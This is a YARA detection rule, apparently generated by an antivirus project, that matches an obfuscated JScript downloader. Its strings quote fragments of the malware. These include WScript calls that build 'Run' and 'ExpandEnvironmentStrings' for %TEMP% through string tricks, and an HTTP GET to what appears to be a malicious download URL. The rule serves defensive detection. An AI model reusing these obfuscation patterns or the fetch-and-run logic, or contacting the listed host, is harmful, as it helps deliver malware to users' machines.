rule sig_20160428_175c6896d3d8239676d5d6e2b803c8d3 {
  meta:
    description = "datamaliciousorder - file 20160428_175c6896d3d8239676d5d6e2b803c8d3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "18e9201e24368c36399f773d69726664e268d7076ffaef4e14d466d3417d9153"

  strings:
    $s1  = "return OetBbsUwcWrlOgqNqhBvi - XveXguGhwWmdYnrNlrEag;};" fullword ascii
    $s2  = "function UjdKhfJqsDdmLjrRqlDgc(OetBbsUwcWrlOgqNqhBvi, XveXguGhwWmdYnrNlrEag){PnfDqlOsoZfjTffEcuInv = PnfDqlOsoZfjTffEcuInv * 1; " ascii
    $s3  = "function NvmIlaHedJkhElbPjySuc(EwzAcmFqkOijMuiWbsXek){GkmRzoHyhOnfUpzPuiHcw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function UjdKhfJqsDdmLjrRqlDgc(OetBbsUwcWrlOgqNqhBvi, XveXguGhwWmdYnrNlrEag){PnfDqlOsoZfjTffEcuInv = PnfDqlOsoZfjTffEcuInv * 1; " ascii
    $s5  = "function SffRnqYdrXzqHolQpnJrm() {return GkmRzoHyhOnfUpzPuiHcw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s6  = "function NvmIlaHedJkhElbPjySuc(EwzAcmFqkOijMuiWbsXek){GkmRzoHyhOnfUpzPuiHcw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s7  = "var GkmRzoHyhOnfUpzPuiHcw = function JxgZpoTbpZgeDikSxyKrs() {return NpmXtrRpjFbjWwiAwdSau[QjhAcpTxwOhzYsaAvmFfl](\"WScript\"+\"" ascii
    $s8  = "OuqRnzTncGunXorDdhJjn[QjbZeeOwnOnrPdjQxdMyd](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s9  = "var NpmXtrRpjFbjWwiAwdSau = this[\"WScript\"];" fullword ascii
    $s10 = "var GkmRzoHyhOnfUpzPuiHcw = function JxgZpoTbpZgeDikSxyKrs() {return NpmXtrRpjFbjWwiAwdSau[QjhAcpTxwOhzYsaAvmFfl](\"WScript\"+\"" ascii
    $s11 = "function SffRnqYdrXzqHolQpnJrm() {return GkmRzoHyhOnfUpzPuiHcw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "}while (XlyJfdHfcZisPloGoiKhl);" fullword ascii
    $s13 = "if (OuqRnzTncGunXorDdhJjn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function QbxJprWslCfyArpTisVyo(){return UhrHldRkaSvbFqtIzpNme + \"\";};" fullword ascii
    $s15 = "function KasAgiFxoMypUhwPtyQgz() {return ((ZatWwhBeeTqtTbbFloFzr == true) && (ZatWwhBeeTqtTbbFloFzr == VtfAnhEdwGgjYssKixUrs)) ?" ascii
    $s16 = "function KasAgiFxoMypUhwPtyQgz() {return ((ZatWwhBeeTqtTbbFloFzr == true) && (ZatWwhBeeTqtTbbFloFzr == VtfAnhEdwGgjYssKixUrs)) ?" ascii
    $s17 = "function HiwCzzPbsTybRxsTriUct(){return 23;};" fullword ascii
    $s18 = "AtsMkuZyjOosKxjGfyOvc = true;" fullword ascii
    $s19 = "return UjdKhfJqsDdmLjrRqlDgc(1 == 1 ? VtdEhgDojRjhPbnRkgOky : 0, 1 == 1 ? DcnQvwYnwAifUriPxbPzu : 0);" fullword ascii
    $s20 = "var VtfAnhEdwGgjYssKixUrs = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}